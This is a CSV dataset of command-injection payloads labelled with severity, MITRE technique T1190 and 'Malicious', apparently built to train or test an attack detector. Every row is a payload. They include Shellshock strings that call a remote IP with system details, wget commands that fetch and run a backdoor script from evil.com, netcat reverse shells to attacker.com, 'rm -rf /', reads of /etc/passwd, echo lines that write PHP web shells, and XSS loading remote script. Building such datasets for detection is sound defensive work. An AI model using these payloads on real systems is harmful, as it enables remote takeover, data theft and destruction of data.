Payload,Signature,AttackType,Severity,MITRE,Label,Description
"() { :;}; /bin/bash -c ""sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=9&?vuln=9""",Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
"() { :;}; /bin/bash -c ""sleep 6 && echo vulnerable 6""",Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=17?user=\`whoami\`""",Command Injection,Command Injection,High,T1190,Malicious,Command Injection payload from comprehensive dataset
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=19?pwd=\`pwd\`""",Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=23?uname=\`uname -a\`""",Command Injection,Command Injection,High,T1190,Malicious,Command Injection payload from comprehensive dataset
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=25?shell=\`nc -lvvp 1235 -e /bin/bash\`""",Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=27?shell=\`nc -lvvp 1237 -e /bin/bash &\`""",Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=4""",Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
"<!--#exec cmd=""/usr/bin/id;-->",Command Injection,Command Injection,High,T1190,Malicious,Command Injection payload from comprehensive dataset
| cat /etc/passwd,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
&& wget http://evil.com/backdoor.sh -O /tmp/backdoor.sh && chmod +x /tmp/backdoor.sh && /tmp/backdoor.sh,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
&& nc -e /bin/sh attacker.com 4444,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
; ping -c 10 attacker.com,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
; rm -rf /,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
"; echo ""vulnerable"" > /tmp/pwned.txt",Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
&& wget http://evil.com/backdoor.sh -O /tmp/backdoor.sh && chmod +x /tmp/backdoor.sh && /tmp/backdoor.sh,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
&& nc -e /bin/sh attacker.com 4444,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
&& wget http://evil.com/backdoor.sh -O /tmp/backdoor.sh && chmod +x /tmp/backdoor.sh && /tmp/backdoor.sh,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
| cat /etc/passwd,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
| netstat -an,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
%0a%0d,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
%0Aid,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
%0a id %0a,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
%0Aid%0A,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
%0a ping -i 30 127.0.0.1 %0a,Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
%0A/usr/bin/id,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
%0A/usr/bin/id%0A,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
"%2 -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\"" |ping -n 21 127.0.0.1",Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
%20{${phpinfo()}},Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
%20{${sleep(20)}},Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
%20{${sleep(3)}},Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
a|id|,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
a;id|,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
a;id;,Command Injection,Command Injection,High,T1190,Malicious,Command Injection payload from comprehensive dataset
a;id\n,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
() { :;}; curl http://135.23.158.130/.testing/shellshock.txt?vuln=12,Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
"curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\"" |curl https://crowdshield.com/.testing/rce_vuln.txt",Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
"curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\"" |curl https://crowdshield.com/.testing/rce_vuln.txt",Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
$(`curl https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`),Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
; ping -c 10 attacker.com,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
| dir,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
; dir,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
$(`dir`),Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
& dir,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
&&dir,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
&& dir,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
| dir C:\,Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
; dir C:\,Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
& dir C:\,Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
&& dir C:\,Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
dir C:\,Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
| dir C:\Documents and Settings\*,Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
; dir C:\Documents and Settings\*,Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
& dir C:\Documents and Settings\*,Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
&& dir C:\Documents and Settings\*,Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
dir C:\Documents and Settings\*,Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
| dir C:\Users,Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
; dir C:\Users,Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
& dir C:\Users,Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
&& dir C:\Users,Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
dir C:\Users,Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
;echo%20'<script>alert(1)</script>',Command Injection,Command Injection,High,T1190,Malicious,Command Injection payload from comprehensive dataset
echo '<img src=https://crowdshield.com/.testing/xss.js onload=prompt(2) onerror=alert(3)></img>'// XXXXXXXXXXX,Command Injection,Command Injection,High,T1190,Malicious,Command Injection payload from comprehensive dataset
"| echo ""<?php include($_GET['page'])| ?>"" > rfi.php",Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
"; echo ""<?php include($_GET['page']); ?>"" > rfi.php",Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
"& echo ""<?php include($_GET['page']); ?>"" > rfi.php",Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
"&& echo ""<?php include($_GET['page']); ?>"" > rfi.php",Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
"echo ""<?php include($_GET['page']); ?>"" > rfi.php",Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
"| echo ""<?php system('dir $_GET['dir']')| ?>"" > dir.php",Command Injection,Command Injection,Critical,T1190,Malicious,Command Injection payload from comprehensive dataset
"; echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php",Command Injection,Command Injection,Critical,T1190,Malicious,Command Injection payload from comprehensive dataset
"& echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php",Command Injection,Command Injection,Critical,T1190,Malicious,Command Injection payload from comprehensive dataset
"&& echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php",Command Injection,Command Injection,Critical,T1190,Malicious,Command Injection payload from comprehensive dataset
"echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php",Command Injection,Command Injection,Critical,T1190,Malicious,Command Injection payload from comprehensive dataset
"| echo ""<?php system($_GET['cmd'])| ?>"" > cmd.php",Command Injection,Command Injection,Critical,T1190,Malicious,Command Injection payload from comprehensive dataset
"; echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",Command Injection,Command Injection,Critical,T1190,Malicious,Command Injection payload from comprehensive dataset
"& echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",Command Injection,Command Injection,Critical,T1190,Malicious,Command Injection payload from comprehensive dataset
"&& echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",Command Injection,Command Injection,Critical,T1190,Malicious,Command Injection payload from comprehensive dataset
"echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",Command Injection,Command Injection,Critical,T1190,Malicious,Command Injection payload from comprehensive dataset
;echo '<script>alert(1)</script>',Command Injection,Command Injection,High,T1190,Malicious,Command Injection payload from comprehensive dataset
echo '<script>alert(1)</script>'// XXXXXXXXXXX,Command Injection,Command Injection,High,T1190,Malicious,Command Injection payload from comprehensive dataset
echo '<script src=https://crowdshield.com/.testing/xss.js></script>'// XXXXXXXXXXX,Command Injection,Command Injection,High,T1190,Malicious,Command Injection payload from comprehensive dataset
() { :;}; echo vulnerable 10,Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
eval('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'),Command Injection,Command Injection,Critical,T1190,Malicious,Command Injection payload from comprehensive dataset
